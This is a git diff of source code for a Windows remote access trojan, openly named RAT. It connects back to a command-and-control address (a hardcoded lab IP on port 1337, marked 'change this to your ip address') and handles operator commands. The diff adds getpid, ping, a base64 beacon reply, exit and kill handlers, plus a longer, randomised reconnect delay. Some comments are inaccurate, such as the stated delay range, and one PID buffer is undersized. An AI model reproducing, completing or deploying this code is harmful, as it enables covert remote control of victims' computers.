@@ -2,6 +2,7 @@
 #include <winsock2.h>
 #include <windows.h>  //Used for WinApi calls
 #include <ws2tcpip.h> //TCP-IP Sockets
+
 #include <stdio.h>
 #include <time.h>
 
@@ -75,7 +76,6 @@ DWORD getpid(){
 	return pid;
 }
 
-
 //# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 //# ======================================================================================================================================================================================
 //# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -86,12 +86,11 @@ void RAT(char* C2_Server, int C2_Port)
 
     while (true)
     {
-        Sleep((rand() % 20) + 5);    // Trys to reconnect every 5-25 seconds
+        Sleep((rand() % 45000) + 10000);    // Trys to reconnect every 10-45 seconds
 
         SOCKET tcp_sock;
         sockaddr_in addr;
         WSADATA wsa_version;
-
 
         WSAStartup(MAKEWORD(2,2), &wsa_version);
         tcp_sock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
@@ -178,13 +177,60 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
-                else if ((strcmp(CommandReceived, "exit") == 0))
+                else if ((strcmp(CommandReceived, "getpid") == 0))
+                {   
+                    DWORD pid;
+                    char char_pid[6];
+                    pid = getpid();
+
+                    // Convert DWORD to char (using base 10)
+                    _ultoa(pid,char_pid,10);
+
+                    char buffer[20] = "";
+                    strcat(buffer, "Current PID: ");
+                    strcat(buffer, char_pid);
+                    strcat(buffer, "\n");
+                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);
+
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+                }
+                else if (strcmp(CommandReceived, "ping") == 0)
+                {
+                    char buffer[64] = "";
+                    strcat(buffer,"[*Agent-msg] PONG\n");
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+			    }
+                else if (strcmp(CommandReceived, "beacon") == 0)
+                {
+                    char buffer[128] = "";
+                    strcat(buffer,"d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy");
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+			    }
+                else if (strcmp(CommandReceived, "exit") == 0)
                 {
                     closesocket(tcp_sock);
                     WSACleanup();
-                    
-                    //exit(0);
+                    std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
+                    Sleep(1000);
+                    std::cout << "Sleep End... Returning" << std::endl;
+                    break;
                 }
+                else if (strcmp(CommandReceived, "kill") == 0) 
+                {
+                    closesocket(tcp_sock);
+                    WSACleanup();
+                    std::cout << "Socket killed. WSA Cleaned. Sleep Start" << std::endl;
+                    Sleep(1000);
+                    std::cout << "Dying..." << std::endl;
+                    exit(0);
+			    }
                 else
                 {
                     char buffer[64] = "";
@@ -199,10 +245,10 @@ void RAT(char* C2_Server, int C2_Port)
         }
     }
 }
+
 //# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 //# ======================================================================================================================================================================================
 //# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
 
 int main(int argc, char **argv) {
 
@@ -212,12 +258,13 @@ int main(int argc, char **argv) {
     ShowWindow(stealth,SW_SHOWNORMAL);                  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
 
     // FreeConsole();
-    if (argc == 3) {
+    if (argc == 3) 
+    {
         int port  = atoi(argv[2]); 
         RAT(argv[1], port);
     }
     else {
-        char host[] = "192.168.17.10";     // change this to your ip address
+        char host[] = "192.168.75.100";     // change this to your ip address
         int port = 1337;                    // change this to your open port
         RAT(host, port);
     }
